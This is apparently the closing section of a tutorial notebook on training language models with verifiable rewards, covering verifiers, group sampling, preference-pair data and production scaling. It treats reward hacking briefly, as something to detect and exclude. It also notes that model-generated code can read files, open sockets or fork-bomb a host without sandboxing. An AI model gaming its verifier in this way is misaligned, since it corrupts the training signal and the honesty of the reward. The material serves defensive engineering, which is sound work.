- Once you train against a verifier, it *is* the objective — Goodhart's law makes reward-hacking detection and an append-only audit trail (`artifacts/verifier.jsonl`) part of the core pipeline, not an afterthought.
- Code verification generalizes the idea: unit tests yield fractional rewards, and executing untrusted generated code demands sandboxing in anything beyond a demo.
- Verified groups become training data two ways: `{prompt, chosen, rejected}` pairs for DPO-style trainers, or raw group rewards for GRPO — with hack-suspect samples excluded so the next policy doesn't learn to cheat.

Where to go next: feed `artifacts/preferences.jsonl` to TRL's [`DPOTrainer`](https://huggingface.co/docs/trl/dpo_trainer); plug these reward functions into Session 15's GRPO run; or read how the labs do it at scale — [Tülu 3](https://arxiv.org/abs/2411.15124) (which coined RLVR) and [DeepSeek-R1](https://arxiv.org/abs/2501.12948).

---
## Conclusion: What We Built, Start to Finish

Walking back through the notebook, the full RLVR arc was:

1. **A policy** (Task 1) — a small API model sampled at temperature 1.0, chosen precisely because it is *sometimes wrong*.
2. **A verifiable domain** (Task 2) — math problems with ground-truth answers and a `\boxed{}` convention that makes checking mechanical.
3. **A reward function** (Task 3) — deterministic, normalized, and asymmetric (+1.0 / −0.1) so early failure doesn't teach refusal.
4. **The sampling loop** (Task 4) — *groups* of completions per prompt, the same structure GRPO computes advantages over, and the source of correct/incorrect contrast.
5. **Adversarial thinking** (Task 5) — once you train against a verifier it *is* the objective, so hack detection and an append-only audit trail are part of the pipeline, not an afterthought.
6. **A second domain** (Task 6) — code judged by unit tests, showing rewards can be fractional and that verification can mean *executing untrusted output*.
7. **Training data** (Task 7) — audited verifier decisions became `{prompt, chosen, rejected}` pairs, with hack-suspects excluded so the next policy iteration doesn't learn to cheat.

The single idea underneath all of it: **wherever a deterministic program can check correctness, you can turn cheap inference into training signal** — no human labelers, no learned reward model. The verifier's quality *is* the ceiling on the policy's quality.

## What Looks Different in Production

This notebook is the smallest honest version of RLVR. Scaling it into a real training pipeline changes nearly every component:

**Sandboxed code execution.** Our `CodeVerifier` runs model-generated code in a bare `subprocess` on your machine — fine for a demo, unacceptable in production, where the policy *will* eventually generate code that reads the filesystem, opens sockets, or fork-bombs the host (and our timeout catches none of that). Production verifiers execute candidates in isolated, disposable environments: [Vercel Sandbox](https://vercel.com/docs/vercel-sandbox) is a good example — ephemeral microVMs built to run untrusted, LLM-generated code with CPU/memory limits, network controls, and full teardown after each run. Self-hosted equivalents include gVisor, Firecracker microVMs, or locked-down containers. The rule: the verifier defines the reward, so the verifier's execution environment is a *security boundary*.

**Scale and throughput.** Five problems × 4 samples becomes tens of thousands of prompts × 8–64 samples per RL step. Sequential API calls give way to async/batched sampling against a dedicated inference fleet (vLLM, as in Session 15) — generation throughput, not the policy update, is usually the bottleneck.

**Verifier hardening.** Regex extraction and exact match get replaced by symbolic math checkers (e.g., SymPy-based equivalence), multiple test suites with hidden held-out cases, and stacked format rewards — because at scale, every blind spot *will* be found and exploited.

**Governance.** Our `verifier.jsonl` becomes real infrastructure: versioned datasets, per-run ledgers, flagged-sample review queues, and dashboards tracking reward distributions for drift. When someone asks "was this model trained on honest rewards?", the audit trail is the answer — this is exactly the artifact regulated environments (the origin of this material) require.

**The training loop itself.** The preference pairs here feed an actual policy update — DPO or GRPO — and then the loop *repeats* against the updated policy: sample, verify, update, again. One pass through this notebook is a single iteration of that flywheel.